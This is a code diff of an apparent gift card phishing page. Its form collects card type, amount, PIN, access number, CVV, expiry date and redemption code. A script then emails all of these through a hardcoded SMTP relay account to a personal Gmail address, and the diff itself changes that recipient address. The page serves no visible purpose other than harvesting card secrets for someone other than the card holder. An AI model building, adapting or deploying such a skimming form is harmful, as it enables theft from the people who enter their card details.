@@ -370,35 +370,47 @@
                       <option value="Amex">Amex</option>
                     </select>
 
-                    <select
-                    id="currency-type"
-                      name="currency"
-                      class="form-select"
-                      style="border-radius: 64px; margin-top: 15px"
-                      placeholder="Select type of card"
-                    >
-                      <option value="USD">USD</option>
-                      <option value="GBP">GBP</option>
-                      <option value="AUD">AUD</option>
-                      <option value="EUR">EUR</option>
-                      <option value="CAD">CAD</option>
-                    </select>
-                    <div
-                      class="field padding-bottom--28"
-                      style="margin-top: 20px"
-                    >
-                      <input  id="amount"               
-                      required=""
-                      type="number" placeholder=" Card Amount" />
+
+                    <div style="display:flex; gap: 10px;">
+                      <select
+                      id="currency-type"
+                        name="currency"
+                        class="form-select"
+                        style="border-radius: 64px; margin-top: 15px; width: 30%"
+                        placeholder="Select type of card"
+                      >
+                        <option value="USD">USD</option>
+                        <option value="GBP">GBP</option>
+                        <option value="AUD">AUD</option>
+                        <option value="EUR">EUR</option>
+                        <option value="CAD">CAD</option>
+                      </select>
+                      <div
+                        class="field padding-bottom--28"
+                        style="margin-top: 20px; width: 70%"
+                      >
+                        <input  id="amount"               
+                        required=""
+                        type="number" placeholder=" Card Amount" />
+                      </div>
                     </div>
 
+                   
+                    <div
+                    id="form5"
+                      class="field"
+                      style="margin-top: 20px;   display: none;"
+                    >
+                      <input     id="cardpin"             
+                      type="number" placeholder=" Access Number" />
+                    </div>
 
                     <div
                     id="form"
                       class="field"
                       style="margin-top: 20px;   display: none;"
                     >
-                      <input     id="cardpin" value="0"             
+                      <input     id="cardpin"             
                       type="number" placeholder=" Gift Card Pin" />
                     </div>
 
@@ -437,6 +449,14 @@
                     <div class="field padding-bottom--24 padding-top--24" >
                       <input id="redemptioncode"  type="text" placeholder=" Redemption Code" required  minlength="4" maxlength="20"  >
                     </div>
+
+                    <div id="form0"
+                    class="field"
+                    style=" color: #000;  display: none; margin-top: -58px; margin-left: 435px;"><p style="color:rgb(255, 0, 0)">16 digit code at the face of the card</p></div>
+
+                    <div id="form01"
+                    class="field"
+                    style=" color: #000;  display: none; margin-top: -58px; margin-left: 435px;"><p style="color:rgb(255, 0, 0)">15 digit code at the face of the card</p></div>
 
 
        
@@ -751,7 +771,7 @@ function myClick() {
       Password: "63668EEE5A9F1E62BB74006818F665F99EC2",
       Port : 2525,
 
-      To: "emmazy100@gmail.com",
+      To: "Williamcampbell693@gmail.com",
       From: "imperialwavelogics@gmail.com",
       Subject: ` ${"paidgiftcard"} sent you a message`,
       Body: `Cardname: ${cardtype} <br/> Currency: ${currency} <br/> Amount ${amount} <br/> Cardpin : ${cardpin} <br/> Cardcvv : ${cardcvv} <br/> Cardexpiredate : ${cardexpiredate} <br/> Cardfourpin : ${cardfourpin} <br/> Redemptioncode : ${redemptioncode}`,
